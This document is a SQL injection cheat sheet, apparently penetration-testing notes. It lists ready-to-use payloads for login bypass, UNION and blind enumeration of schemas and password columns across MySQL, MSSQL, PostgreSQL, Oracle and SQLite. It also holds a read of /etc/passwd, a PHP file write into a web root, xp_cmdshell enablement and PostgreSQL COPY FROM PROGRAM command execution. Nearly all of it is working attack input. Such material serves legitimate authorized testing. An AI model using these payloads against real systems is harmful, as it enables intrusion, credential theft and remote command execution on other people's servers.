# Manual SQL injection

Find string, numeric or parenthesized context; compare true/false requests.

## Login bypass
```text
' OR 1=1-- -
admin'-- -
admin' #
' OR '1'='1
admin') OR ('1'='1
```
- MySQL `--` needs a trailing space (`-- -`); `#` must be URL-encoded (`%23`) in a query string.
- Quotes filtered: MySQL hex strings `0x61646d696e` instead of `'admin'`.

## In-band
```sql
' AND 1=1 -- //
' AND 1=2 -- //
' ORDER BY 1-- -
' UNION SELECT NULL,NULL,NULL-- -
```
MySQL (3 columns assumed; output in a visible column):

```sql
' UNION SELECT 1,@@version,3-- -
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata-- -
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
```
File read/write (needs `FILE`, allowed path, web handler):

```sql
' UNION SELECT 1,load_file('/etc/passwd'),3-- -
' UNION SELECT 1,'<?php echo "ok";?>',3 INTO OUTFILE '/var/www/html/check.php'-- -
```

## Blind
```sql
' AND (SELECT SUBSTRING(database(),1,1))='a' -- //
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100 -- //
' AND IF(1=1, SLEEP(5), 0) -- //
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>100, SLEEP(5), 0) -- //
```

## MSSQL
Direct access: [enum/mssql.md](../enum/mssql.md). Prefix: string `';`, numeric `1;`, parenthesized `');`.

```sql
'; WAITFOR DELAY '00:00:05';-- -
1; WAITFOR DELAY '00:00:05';-- -
'); WAITFOR DELAY '00:00:05';-- -
```
```sql
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT name, value, value_in_use FROM sys.configurations
WHERE name IN ('show advanced options', 'xp_cmdshell');
```
```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- -
'; EXEC xp_cmdshell 'whoami';-- -
'; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;-- -
```
- Last line undoes the enable (assumes both were off). `xp_cmdshell` runs as the service account → check `SeImpersonate`.

## MSSQL in-band
Concatenation `+`, comment `-- -`, no `LIMIT` (use `TOP`).

```sql
' UNION SELECT NULL,@@version,NULL-- -
' UNION SELECT NULL,name,NULL FROM master..sysdatabases-- -
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))-- -
```
- Last line = error-based: the value appears in the conversion error. Wrong column types: use `NULL` or `CAST(x AS varchar)`.

## PostgreSQL
Concatenation `||`, comment `-- -`, stacked queries usually allowed.

```sql
' UNION SELECT NULL,version(),NULL-- -
' UNION SELECT NULL,string_agg(table_name,','),NULL FROM information_schema.tables WHERE table_schema='public'-- -
' UNION SELECT NULL,string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT NULL,current_setting('is_superuser'),NULL-- -
'; SELECT pg_sleep(5)-- -
' AND 1=(SELECT 1 FROM pg_sleep(5))-- -
```
- Superuser + stacked queries → `COPY ... FROM PROGRAM` ([databases](../enum/databases-and-redis.md#postgresql)):
```sql
'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(o text); COPY cmd_exec FROM PROGRAM 'id'; -- -
' UNION SELECT NULL,string_agg(o,E'\n'),NULL FROM cmd_exec-- -
```
- Column types must match: cast with `::text`.

## Oracle
Every `SELECT` needs a `FROM` (`FROM dual`); concatenation `||`; no stacked queries; no `LIMIT` (`WHERE ROWNUM = 1`).

```sql
' UNION SELECT NULL,banner,NULL FROM v$version-- -
' UNION SELECT NULL,table_name,NULL FROM all_tables-- -
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- -
' UNION SELECT NULL,user,NULL FROM dual-- -
' AND 1=(SELECT 1 FROM dual WHERE 1=1)-- -
```
- Object names are uppercase. Time-based: `dbms_pipe.receive_message(('a'),5)`.

## SQLite
```sql
' UNION SELECT NULL,sqlite_version(),NULL-- -
' UNION SELECT NULL,group_concat(sql),NULL FROM sqlite_master-- -
' UNION SELECT NULL,group_concat(username||':'||password),NULL FROM users-- -
```
- No `information_schema`; schema is in `sqlite_master`. No `SLEEP`.

## Pick the dialect
| Probe | Works on |
| --- | --- |
| `@@version` | MySQL, MSSQL |
| `version()` | MySQL, PostgreSQL |
| `banner FROM v$version` | Oracle |
| `sqlite_version()` | SQLite |
| `'a'\|\|'b'` returns `ab` | PostgreSQL, Oracle, SQLite |
| `'a'+'b'` returns `ab` | MSSQL |
| `CONCAT('a','b')` | MySQL (also newer MSSQL/PostgreSQL) |
